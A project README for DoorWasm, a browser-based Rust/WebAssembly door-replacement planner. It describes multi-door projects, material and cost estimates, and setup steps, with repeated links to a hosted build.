# DoorWasm - Home Improvement Planning Calculator 2026

> **DoorWasm is a Rust-powered WebAssembly door replacement planner that helps build multi-door projects, calculate materials and costs, and estimate installation schedules.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owen-cooperrc5097/doorwasm-door-planner?style=flat-square)](https://github.com/owen-cooperrc5097/doorwasm-door-planner)

---

<p align="center">
  <a href="https://owen-cooperrc5097.github.io/doorwasm-door-planner/">
    <img src="https://img.shields.io/badge/Download-DoorWasm%20Latest-brightgreen?style=for-the-badge" alt="Download DoorWasm">
  </a>
</p>

> **[Download DoorWasm](https://owen-cooperrc5097.github.io/doorwasm-door-planner/)**

---

[Download Latest Build](https://owen-cooperrc5097.github.io/doorwasm-door-planner/)

---

## What DoorWasm Does

DoorWasm runs in the browser and provides a planning workspace for door replacement projects. Add multiple openings to one project, determine the required materials, compare available quality tiers, and obtain estimates for total cost and installation time.

Alongside its visual opening preview, the application includes a pre-installation checklist and productivity recommendations. The Rust-based WebAssembly implementation keeps the calculation workflow available within the browser.

---

## Capabilities

- Create projects that include multiple door openings.
- Produce a material takeoff for the selected replacements.
- Compare estimated expenses across quality tiers.
- Work out an approximate installation duration.
- Optimize multiple openings to help limit waste and material spending.
- View a visual representation of planned openings.
- Check preparation activities before work starts.
- Save project information and reopen it during a later planning session.

---

## Getting Started

### Open the hosted version

Use a modern web browser to access the most recent published build:

[Open DoorWasm](https://owen-cooperrc5097.github.io/doorwasm-door-planner/)

### Check out the repository

```bash
git clone https://github.com/owen-cooperrc5097/doorwasm-door-planner.git
cd REPO
```

After cloning, start a local static web server and visit the local address it provides. HTTP hosting is recommended because WebAssembly resources and browser modules may not work correctly when opened directly from the filesystem.

When building from the Rust and WebAssembly sources instead of using the prebuilt site, install the Rust and WebAssembly tooling specified by the project before starting the build.

---

## Workflow

1. Launch DoorWasm in a modern browser.
2. Create a project and add every opening scheduled for replacement.
3. Provide the measurements and other project information.
4. Inspect the visual preview associated with each opening.
5. Choose the material quality tier that matches the plan.
6. Review the material list, projected cost, and estimated installation time.
7. Use bulk optimization to compare material requirements for several openings.
8. Save the project or load one that was saved previously.
9. Follow the prework checklist and productivity guidance when preparing the installation.

---

## Project Data and Build Setup

Most DoorWasm configuration is supplied through the project details entered in the web interface. Door records, quality selections, optimization settings, and saved plans are handled within the planning workflow.

If you are using a source checkout, place generated WebAssembly output and associated web files where the application expects them. Consult the repository build instructions before modifying the Rust or WebAssembly configuration.

---

## Requirements

- A current web browser that supports WebAssembly.
- Internet access when using the hosted build.
- A local static server for a checked-out copy.
- Rust and a WebAssembly toolchain when rebuilding from source.
- Adequate browser storage for saved projects and local planning data.

---

## Frequently Asked Questions

### Who can use DoorWasm?

DoorWasm is useful for homeowners, installers, and others preparing door replacement work, particularly projects involving several openings.

### Is multi-door planning supported?

Yes. A single project can contain multiple doors, with calculations combined across its openings.

### Can estimates use different material quality levels?

Yes. The cost estimate can be examined with different quality tiers selected.

### How can I return to a project later?

Use the application’s save and load controls. Saved project details can be reopened whenever you need to continue planning.

### What should I do if the hosted build does not load?

Open the latest build in a current browser and refresh the page. For a local copy, verify that the repository is being served over local HTTP instead of being opened directly as filesystem files.

### Where do updates appear?

New versions are delivered through the project’s web build. Visit the download link again to use the latest available build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
